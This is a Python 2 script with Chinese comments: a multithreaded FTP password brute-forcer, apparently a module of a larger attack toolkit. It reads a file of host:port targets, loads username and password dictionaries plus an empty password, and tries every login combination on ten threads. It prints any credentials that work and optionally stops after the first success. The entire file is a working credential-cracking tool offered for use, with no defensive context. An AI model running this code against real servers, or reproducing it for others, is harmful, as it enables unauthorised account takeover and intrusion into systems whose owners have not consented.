#!/usr/bin/env python
# -*- coding: utf-8 -*-
from ftplib import FTP
import sys

"""
degger调用explode单个爆破
可以指定地址txt文件，进行批量爆破，txt格式为host:port
"""
USER_DIC_ARR = []
PASSWD_DIC_ARR = []
# 懒爆破只爆破一个后retun,避免ftp因为空密码，造成任意密码刷屏
LAZY_EXPOLDE = True

def explode(host,port,dic):
    ftp = FTP()
    try:
        ftp.connect(host,port,timeout=10)
    except:
        return
    for username in dic['username']:
        for password in dic['password']:
            if connectToFtpServer(ftp,host,port,username,password):
                print '\33[33m'+host+':ftp\t'+'username:'+username+'\tpassword:'+password+'\33[37m'
                # 加入return之后则在爆破成功一个账号后，不进行全字典爆破，可提高效率
                if LAZY_EXPOLDE:
                    return

def connectToFtpServer(ftpIns,host,port,username,passwd):
    try:
        ftpIns.login(username,passwd)
        return True
    except Exception:
        return False



def getUserDic():
    global USER_DIC_ARR
    return USER_DIC_ARR

def getPasswdDic():
    global PASSWD_DIC_ARR
    return PASSWD_DIC_ARR

def explodeListHp(hp):
    print 'ftper start explode '+hp+'\n'
    host = hp.split(':')[0]
    port = int(hp.split(':')[1])
    ftp = FTP()
    try:
        ftp.connect(host=host, port=port, timeout=10)
    except Exception:
        print '\33[34mftp://'+host+':'+str(port)+'\tbad connection\33[37m'
    userDic = getUserDic()
    passwdDic = getPasswdDic()
    for username in userDic:
        for password in passwdDic:
            if connectToFtpServer(ftp,host,port,username,password):
                print '\33[33m'+host+':ftp\t'+'username:'+username+'\tpassword:'+password+'\33[37m'
                if LAZY_EXPOLDE:
                    return



if __name__ == '__main__':
    if len(sys.argv)!=2:
        print "please indicate the file path"
        sys.exit(2)
    file_path = sys.argv[1]
    hpArr = []
    try:
        f = open(file_path,'r')
        for hp in f.readlines():
            hpArr.append(hp.strip('\n'))
        f.close()
    except:
        print "file path ill legal"
        sys.exit(2)
    #加载字典
    f = open('../dict/ftp_u.dic')
    for line in f.readlines():
        USER_DIC_ARR.append(line.strip('\n'))
    f.close()
    f = open('../dict/ftp_p.dic')
    for line in f.readlines():
        PASSWD_DIC_ARR.append(line.strip('\n'))
    PASSWD_DIC_ARR.append('')
    f.close()
    #多线程爆破
    import threadpool
    pool = threadpool.ThreadPool(10)
    requests = threadpool.makeRequests(explodeListHp, hpArr)
    [pool.putRequest(req) for req in requests]
    pool.wait()
    pool.dismissWorkers(10, do_join=True)
